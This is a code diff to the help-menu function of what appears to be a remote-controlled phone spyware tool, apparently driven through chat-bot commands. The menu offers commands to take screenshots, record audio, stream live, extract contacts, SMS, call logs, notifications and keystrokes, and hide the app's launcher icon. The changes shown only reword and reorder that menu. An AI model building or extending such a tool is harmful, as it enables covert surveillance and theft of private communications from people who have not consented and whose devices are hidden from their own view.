@@ -290,45 +290,51 @@ function getHelpMessage() {
 /network - Get network info (IP, WiFi, Mobile)
 
 *📸 Media Commands*
-/screenshot - Take a screenshot
-/record - Start 60s audio recording
+/screenshot - Take a screenshot NOW
+/record - Start 60s audio recording NOW
 /stream_start - Start live streaming
 /stream_stop - Stop live streaming
 
 *📱 Data Extraction Commands*
-/contacts - Get contact list (up to 100)
+/contacts - Get contact list
 /calllogs - Get recent call logs
 /sms - Get recent SMS messages
 /apps - List installed apps
 /keystrokes - Get recent keystrokes
 /notifications - Get recent notifications
 
-*⚙️ Service Commands*
-/start_screenshot - Start screenshot service
+*⚙️ Service Control Commands*
+/start_screenshot - Start screenshot SERVICE (continuous)
 /stop_screenshot - Stop screenshot service
-/start_recording - Start scheduled recording
+/start_recording - Start scheduled recording SERVICE
 /stop_recording - Stop recording service
 /start_stream - Start streaming service
 /stop_stream - Stop streaming service
 
 *🛠️ Utility Commands*
-/help - Show this help menu
 /ping - Test connection
-/echo [text] - Echo back text
 /time - Get device time
 /info - Get detailed device info
-
-*⚠️ Danger Commands*
-/clear_logs - Clear all logs
-/reboot_app - Restart services
-/hide_icon - Hide launcher icon
-/show_icon - Show launcher icon
 
 *📊 Stats Commands*
 /logs_count - Get total log count
 /logs_recent - Get 10 most recent logs
-/logs_by_type [type] - Get logs by type
 /stats - Get detailed statistics
+
+*⚠️ Danger Commands*
+/clear_logs - Clear all logs
+/reboot_app - Restart all services
+/hide_icon - Hide launcher icon
+/show_icon - Show launcher icon
+
+*📋 Quick Reference*
+• Just /record - Quick 60s recording
+• Just /screenshot - Quick screenshot
+• /start_recording - Enable continuous scheduled recording
+• /start_screenshot - Enable continuous screenshot service
+• /reboot_app - Restart all services
+• /hide_icon - Hide app from launcher
+• /show_icon - Show app in launcher
 
 For more help, visit the dashboard at http://127.0.0.1:8080`;
 }
